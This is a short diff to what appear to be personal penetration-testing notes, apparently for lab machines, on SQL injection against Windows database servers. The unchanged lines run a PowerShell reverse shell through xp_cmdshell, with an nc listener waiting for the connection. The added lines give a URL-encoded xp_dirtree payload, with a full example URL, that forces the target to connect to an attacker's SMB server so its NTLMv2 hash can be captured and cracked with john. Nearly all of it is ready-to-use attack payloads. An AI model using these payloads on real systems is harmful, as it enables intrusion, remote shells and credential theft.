@@ -41,3 +41,11 @@ Time-based:
 - should see request so we know file is uploaded
 `'; EXECUTE xp_cmdshell "powershell.exe c:\\Users\Public\\revshell.ps1" -- -`
 - will see connection on nc -lvnp 6969
+
+If SQLi on windows target, start `smbserver.py test . -smb2support` and try appending this to URL where `'` goes:
+```
+;%20EXEC%20master..xp_dirtree%20%22\\10.10.14.5\test%22;%20--
+```
+- replace `10.10.14.5` with kali IP
+- ex: `https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\10.10.14.5\test%22;%20--`
+- catch ntlmv2 hash and crack with john (copy whole thing including username and trailing 00000s)
